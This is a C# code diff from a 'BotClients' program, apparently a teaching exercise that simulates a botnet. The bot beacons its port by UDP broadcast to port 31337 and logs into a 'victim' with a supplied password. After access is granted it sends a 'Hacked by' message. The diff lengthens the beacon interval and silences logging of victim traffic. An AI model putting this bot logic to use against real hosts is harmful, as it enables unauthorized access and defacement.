@@ -67,7 +67,7 @@ namespace BotClients
 			{
 				byte[] int_bytes = BitConverter.GetBytes((Int16)port_);
 				client.Send(int_bytes, int_bytes.Length, new IPEndPoint(IPAddress.Broadcast, 31337));
-				Thread.Sleep(1000);
+				Thread.Sleep(10000);//sent again any 10 sec
 			}
 		}
 
@@ -84,21 +84,21 @@ namespace BotClients
 				try {
 					ns.Read(buffer, 0, buffer.Length);
 					string message = Encoding.Default.GetString(buffer);
-					Console.Write("got from victim: " + message);
+					//Console.Write("got from victim: " + message);
 					if (message.Contains("Please enter password"))
 					{
 						byte[] toSend = Encoding.Default.GetBytes(Encoding.Default.GetString(pass_to_attack) + "\r\n");
 						ns.Write(toSend, 0, toSend.Length);
-						Console.Write("sent from victim: " + Encoding.Default.GetString(pass_to_attack) + "\r\n");
+						//Console.Write("sent from victim: " + Encoding.Default.GetString(pass_to_attack) + "\r\n");
 					}
 					ns.Read(buffer, 0, buffer.Length);
 					string message1 = Encoding.Default.GetString(buffer);
-					Console.Write("got from victim: " + message1);
+					//Console.Write("got from victim: " + message1);
 					if (message1.Contains("Access granted"))
 					{
 						byte[] toSend = Encoding.Default.GetBytes("Hacked by " + Encoding.Default.GetString(name_of_server) + "\r\n");
 						ns.Write(toSend, 0, toSend.Length);
-						Console.Write("sent from victim: " + "Hacked by " + Encoding.Default.GetString(name_of_server) + "\r\n");
+						//Console.Write("sent from victim: " + "Hacked by " + Encoding.Default.GetString(name_of_server) + "\r\n");
 					}
 				}
 				catch (Exception)
